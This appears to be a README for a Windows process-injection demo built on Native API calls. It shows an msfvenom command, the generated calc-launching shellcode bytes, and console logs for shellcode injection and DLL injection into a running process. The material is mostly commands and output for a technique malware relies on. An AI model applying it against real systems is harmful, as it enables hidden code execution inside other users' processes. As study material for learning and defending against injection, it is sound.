# Native API

Compile and run:

```
gcc -m64 .\ntapi.c -o ntapi.exe && .\ntapi.exe (get-process -name Notepad).Id
```

## Shellcode Injection through NTAPI

Generating shellcode:
```bash
msfvenom --platform windows --arch x86 -p windows/exec cmd=calc exitfunc=thread -f c --var-name=shellcode
```
```
No encoder specified, outputting raw payload
Payload size: 189 bytes
Final size of c file: 828 bytes
unsigned char shellcode[] = 
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50"
"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26"
"\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"
"\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78"
"\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3"
"\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58"
"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3"
"\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a"
"\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d"
"\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb"
"\xe0\x1d\x2a\x0a\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
"\xff\xd5\x63\x61\x6c\x63\x00";
```

Example output:

```
[*] Getting handle to module "NTDLL"
[+] Got handle to the module
[*] \___[
          Module:       NTDLL
          Address:      0x00007FFE7E8B0000
        ]
[+] Got NtOpenProcess
[*] \___[
          Original:     NtOpenProcess
          New:          nt_open
          Address:      0x00007FFE7E94F8A0
        ]
[+] Got NtAllocateVirtualMemory
[*] \___[
          Original:     NtAllocateVirtualMemory
          New:          nt_alloc_virtual_mem
          Address:      0x00007FFE7E94F6E0
        ]
[+] Got NtWriteVirtualMemory
[*] \___[
          Original:     NtWriteVirtualMemory
          New:          nt_write_virtual_mem
          Address:      0x00007FFE7E94FB20
        ]
[+] Got NtCreateThreadEx
[*] \___[
          Original:     NtCreateThreadEx
          New:          nt_create_thread
          Address:      0x00007FFE7E950CB0
        ]
[*] Getting handle to process (PID: 34092)
[+] Got handle to process (PID: 34092)
[*] \___[
          PID:          34092
          Address:      0x00000000000000AC
        ]
[*] Allocating virtual memory
[+] Succesfully allocated 190 bytes in process memory
[*] Writing to process memory
[+] Succesfully written 190 bytes to process memory
[*] \___[
          Size:         190
          Payload:

                0xfc 0xe8 0x82 0x00 0x00 0x00 0x60 0x89 0xe5 0x31 0xc0 0x64 0x8b 0x50
                0x30 0x8b 0x52 0x0c 0x8b 0x52 0x14 0x8b 0x72 0x28 0x0f 0xb7 0x4a 0x26
                0x31 0xff 0xac 0x3c 0x61 0x7c 0x02 0x2c 0x20 0xc1 0xcf 0x0d 0x01 0xc7
                0xe2 0xf2 0x52 0x57 0x8b 0x52 0x10 0x8b 0x4a 0x3c 0x8b 0x4c 0x11 0x78
                0xe3 0x48 0x01 0xd1 0x51 0x8b 0x59 0x20 0x01 0xd3 0x8b 0x49 0x18 0xe3
                0x3a 0x49 0x8b 0x34 0x8b 0x01 0xd6 0x31 0xff 0xac 0xc1 0xcf 0x0d 0x01
                0xc7 0x38 0xe0 0x75 0xf6 0x03 0x7d 0xf8 0x3b 0x7d 0x24 0x75 0xe4 0x58
                0x8b 0x58 0x24 0x01 0xd3 0x66 0x8b 0x0c 0x4b 0x8b 0x58 0x1c 0x01 0xd3
                0x8b 0x04 0x8b 0x01 0xd0 0x89 0x44 0x24 0x24 0x5b 0x5b 0x61 0x59 0x5a
                0x51 0xff 0xe0 0x5f 0x5f 0x5a 0x8b 0x12 0xeb 0x8d 0x5d 0x6a 0x01 0x8d
                0x85 0xb2 0x00 0x00 0x00 0x50 0x68 0x31 0x8b 0x6f 0x87 0xff 0xd5 0xbb
                0xf0 0xb5 0xa2 0x56 0x68 0xa6 0x95 0xbd 0x9d 0xff 0xd5 0x3c 0x06 0x7c
                0x0a 0x80 0xfb 0xe0 0x75 0x05 0xbb 0x47 0x13 0x72 0x6f 0x6a 0x00 0x53
                0xff 0xd5 0x63 0x61 0x6c 0x63 0x00 0x00
        ]
[*] Creating Thread
[+] Succesfully got handle to thread
[*] \___[
          Parent:       34092
          Address:      0x00000000000000B0
        ]
[*] Waiting for thread to finish...
[+] Thread finished execution
[*] Cleaning up
[*] Closing handle to thread
[*] Closing handle to process
[+] Cleaned up
```

## DLL Injection through NTAPI

Example output:

```
[*] Getting handle to module "NTDLL"
[+] Got handle to the module
[*] \___[
          Module:       NTDLL
          Address:      0x00007FFE7E8B0000
        ]
[+] Got NtOpenProcess
[*] \___[
          Original:     NtOpenProcess
          New:          nt_open
          Address:      0x00007FFE7E94F8A0
        ]
[+] Got NtAllocateVirtualMemory
[*] \___[
          Original:     NtAllocateVirtualMemory
          New:          nt_alloc_virtual_mem
          Address:      0x00007FFE7E94F6E0
        ]
[+] Got NtWriteVirtualMemory
[*] \___[
          Original:     NtWriteVirtualMemory
          New:          nt_write_virtual_mem
          Address:      0x00007FFE7E94FB20
        ]
[+] Got NtCreateThreadEx
[*] \___[
          Original:     NtCreateThreadEx
          New:          nt_create_thread
          Address:      0x00007FFE7E950CB0
        ]
[*] Getting handle to module "Kernel32"
[+] Got handle to the module
[*] \___[
          Module:       Kernel32
          Address:      0x00007FFE7D750000
        ]
[+] Got LoadLibraryW
[*] \___[
          Original:     LoadLibraryW
          New:          hLoadLibraryW
          Address:      0x00007FFE7D768BE0
        ]
[*] Getting handle to process (PID: 35048)
[+] Got handle to process
[*] \___[
          PID:          35048
          Address:      0x00000000000000AC
        ]
[*] Allocating virtual memory
[+] Succesfully allocated 164 bytes in process memory
[*] Writing to process memory
[+] Succesfully written 164 bytes to process memory
[*] Creating Thread
[+] Succesfully got handle to thread
[*] \___[
          Parent:       35048
          Address:      0x00000000000000B0
        ]
[*] Waiting for thread to finish...
[+] Thread finished execution
[*] Cleaning up
[*] Closing handle to thread
[*] Closing handle to process
[+] Cleaned up
```
